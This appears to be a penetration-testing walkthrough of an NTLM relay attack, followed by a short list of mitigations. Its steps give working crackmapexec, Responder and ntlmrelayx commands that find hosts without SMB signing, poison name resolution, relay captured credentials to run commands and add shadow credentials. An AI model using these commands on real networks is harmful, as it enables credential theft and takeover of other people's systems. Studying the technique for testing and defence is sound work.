# **NTLM Relay Attack**

In an NTLM relay attack, an attacker first gains a position within the network. The attacker then captures authentication messages from legitimate users. These captured authentication requests are relayed to another server, allowing the attacker to impersonate a legitimate user and access network resources.

# **Prerequisites**

- LLMNR or NBT-NS is enabled: 

There must be broadcast traffic in the environment such as Link Local Multicast Name Resolution (LLMNR) and NetBIOS Name Resolution (NBT-NS)

- SMB signing is not required:

There must be a Server Message Block (SMB) server(s) that does not require signing.

# **Process Of Attack**

## **Step 1:**

identify the hosts that have SMB signing disabled

```
crackmapexec smb 192.168.0.0/24 --gen-relay-list
```

![[Pasted image 20251219200542.png]]

## **Step 2:**

reconfigure the Responder.conf file to the following configurations:

```
SMB = Off
HTTP = Off
```

![[Pasted image 20251219200611.png]]

![[Pasted image 20251219200615.png]]

## **Step3:**

Run the Responder

```
sudo responder -I eth0 -dwv -Q
```

![[Pasted image 20251219200645.png]]

## **Step 4:**

After setting up Responder to poison LLMNR and NBT-NS traffic we wait for a user to access an SMB share with signing disabled.

lets make an event !!

go to the any windows machine and access any share randomly fake or not available share

```
./ntlmrelayx.py -t 192.168.0.47 -smb2support -c "whoami"
```

OR

```
./ntlmrelayx.py -tf relayhosts.txt -smb2support -c "whoami"
```

![[Pasted image 20251219200700.png]]

## **Step 5:**

User Attempts to access SMB Share

![[Pasted image 20251219200703.png]]

## **Step 6:**

The responder captures the NTLM Auth Credentials and Relay those captured credentials to the ntlmrelayx tool and this tool will try to access the target host in the network with the Privileges of the User account which the hashes are of.

and we can perform what ever actions we can, Like :

- Dumping NTML Hashes
- running commands on the target server
- executing the reverse shell

![[Pasted image 20251219200709.png]]

## **Step 7: See Impact**

we got the hashes with this switch `--shadow-credentials`

**Command:**

`./ntlmrelayx.py -t 192.168.0.47 -smb2support --shadow-credentials`

OR

`./ntlmrelayx.py -tf relayhosts.txt -smb2support --shadow-credentials`

![[Pasted image 20251219200730.png]]

# **Mitigation Strategies**

By understanding the mechanics of an NTLM relay attack and taking proactive steps to secure your network, you can significantly reduce the threat posed by this enduring vulnerability. Mitigating an NTLM relay attack involves these steps:

• Enforce SMB signing to prevent the interception of NTLM authentication messages.

• [Disable NTLM authentication](https://www.semperis.com/blog/active-directory-security/active-directory-security-best-practices-checklist/#8Disable) wherever possible, in favor of more secure protocols such as Kerberos.

• Implement network segmentation to limit lateral movement.

• Use the Protected Users security group and other Credential Guard features to reduce credential exposure.

Active Directory admins can also take the following steps:

• Audit your network to ensure that SMB signing is enabled on all devices.

• Configure Active Directory to reject NTLM authentication requests from untrusted networks.

• Regularly monitor, patch, and update systems to mitigate known vulnerabilities. Where Active Directory is concerned, a tool like [Semperis Directory Services Protector](https://www.semperis.com/active-directory-security/) can scan for and close vulnerabilities and even automate remediation of suspicious changes in the Active Directory environment.

Educate users on the importance of not reusing credentials across different access points.